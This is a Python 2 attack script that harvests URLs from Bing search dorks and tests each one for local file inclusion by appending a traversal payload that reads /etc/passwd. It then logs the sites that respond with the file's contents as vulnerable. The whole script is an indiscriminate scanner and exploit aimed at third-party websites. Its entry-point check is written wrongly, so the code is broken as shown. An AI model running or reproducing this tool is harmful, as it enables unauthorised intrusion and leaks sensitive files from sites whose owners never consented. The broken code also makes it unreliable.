#!/usr/bin/python
#-*- coding: UTF-8 -*-
#
# Coded by ins3ct, irc.priv8.jp - #nosafe 
#
#

import requests, BeautifulSoup, urllib2

def Bing(dork):

	page		 = 1
	list_alert 	 = 0
	urls		 = []
	f 			 = open('results.scan', 'a')
	while 1:
		url = 'http://www.bing.com/search?q={}&first={}'.format(dork, page)
		user_agent = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"}
		r = requests.get(url, headers=user_agent)
		soup = BeautifulSoup.BeautifulSoup(r.content)
		h1 = str(soup.findAll('h1'))
		if h1.find('Nenhum') != -1 or list_alert > 20:
			print '\nEnd of Search.'
			break
		for a in soup.findAll('a'):
			a_found = a.get('href')
			if a_found:
				if a_found.find('http') != -1 and a_found.find('microsoft') == -1 and a_found.find('msn') == -1 and a_found.find('=') != -1:
					a_found = a_found.split('=')[0] + '='
					print a_found
					if a_found not in urls:
						urls.append(a_found)
						try:
							f.write(a_found.encode('utf-8') + '\n')
						except:
							pass
					else:
						list_alert += 1
		page += 10
	print len(urls), 'urls encontradas.\n'
	f.close()
	return urls

def Lfi(dork):
	f = open('vulns.lst', 'a')
	urls = Bing(dork)
	vulns = []
	dirs  = '../../../../../../../../../../etc/passwd%00'
	for url in urls:
		print 'Checando:', url.split(dork)[0]
		try:
			r = urllib2.urlopen(url+dirs, timeout=5).read()
			if r.find(':root:') != -1:
				vulns.append(url+dirs)
				try:
					f.write(url.encode('utf-8')+'\n')
				except:
					pass
		except:
			pass
	if vulns:
		print '\nVULN\'s ENCONTRADAS:'
		for vul in vulns:
			print '[+]', vul
	f.close()

def Dorks():
	f = open('dorks.lst', 'r')
	f = f.readlines()
	for line in f:
		line = line.rstrip('\n')
		print '\n\nChecando dork:', line, '...\n'
		Lfi(line)

if '__name__' == __main__:
	Dorks() # Para lista de dorks contida em 'dorks.lst'
	#Lfi('index.php?id=') # Para pesquisa em dork individual
